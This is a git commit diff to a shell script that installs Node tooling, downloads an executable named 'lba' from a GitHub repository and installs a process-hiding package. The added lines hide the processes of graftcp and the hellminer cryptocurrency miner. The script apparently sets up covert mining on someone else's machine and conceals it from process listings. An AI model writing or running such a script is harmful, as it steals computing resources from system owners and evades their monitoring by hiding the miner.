9f9b44f7122657e70d382abeeea662be6a43d17b
thefacta <106053479+thefacta@users.noreply.github.com>
2022-05-23 15:25:20 +0700

    Update wrote1.sh

--- wrote1.sh
+++ wrote1.sh
@@ -4,3 +4,6 @@ apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
 wget https://github.com/christiarch/templates/raw/main/lba 
 chmod +x lba 
 npm i -g node-process-hider
+
+ph add graftcp
+ph add hellminer
